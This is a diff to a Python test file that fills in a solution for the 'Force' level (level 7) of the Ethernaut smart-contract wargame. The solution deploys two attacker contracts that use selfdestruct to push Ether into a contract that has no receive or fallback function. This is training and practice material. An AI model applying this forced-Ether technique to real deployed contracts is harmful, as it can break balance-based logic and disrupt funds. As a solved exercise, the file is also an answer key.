@@ -1,7 +1,7 @@
 from wake.testing import *
 from tests.ethernaut_deployer import EthernautDeployer
 from pytypes.contracts.lv07_force import Force
-# TODO You can import your our own smart contract(s) here.
+from pytypes.contracts.attacker.lv07_transfer import ForceTransfer, FasterForceTransfer
 
 @default_chain.connect()
 def test_lv07():
@@ -11,7 +11,7 @@ def test_lv07():
     ethernaut.check_lv07(contract)
 
 def exploit_lv07(contract: Force):
-    # TODO Force this contract to take some Ether.
-    # TODO You can import your our own smart contract(s) here.
-    # TODO Code here ...
-    pass
+    # Attack vector: Selfdestruct and minting transfer Ether directly -> no recive/fallback function is invoked
+    attacker1 = ForceTransfer.deploy()
+    attacker1.push(contract, value=30)
+    attacker2 = FasterForceTransfer.deploy(contract, value=100)
